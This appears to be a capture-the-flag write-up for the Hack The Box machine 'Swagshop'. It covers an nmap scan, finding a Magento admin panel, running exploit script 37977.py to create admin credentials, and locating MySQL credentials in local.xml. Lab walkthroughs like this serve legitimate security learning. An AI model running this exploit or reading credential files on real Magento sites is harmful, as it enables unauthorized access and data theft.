# Swagshop
>Author : Xyan1d3
>Date : 6th July 2021
>IP : 10.10.10.140
>OS : Linux
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jul  6 20:18:05 2021 as: nmap -sC -sV -v -oN nmap/swagshop 10.10.10.140
Nmap scan report for 10.10.10.140
Host is up (0.065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration
We see that `http://10.10.10.140` redirects us to `http://swagshop.htb`.
It is running Magento ecommerce.

The `http://swagshop.htb/index.php/admin` reveals an admin login page.
![[Pasted image 20210706213136.png]]

We have an an admin page vulnerability which allows us to change the admin password.
![[Pasted image 20210706213345.png]]

We need to change the url as the `admin` page is in `index.php/admin/`
We run the exploit and it gives us the credentials to login to the admin panel.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/swagshop]
└──╼ # python2 37977.py 
/usr/local/lib/python2.7/dist-packages/cryptography/__init__.py:39: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  CryptographyDeprecationWarning,
WORKED
Check http://swagshop.htb/index.php/admin with creds forme:forme
```

We use this credentials to login to the magento.
![[Pasted image 20210706225114.png]]

We have the mysql credentials on the `http://swagshop.htb/app/etc/local.xml`.
![[Pasted image 20210706231710.png]]

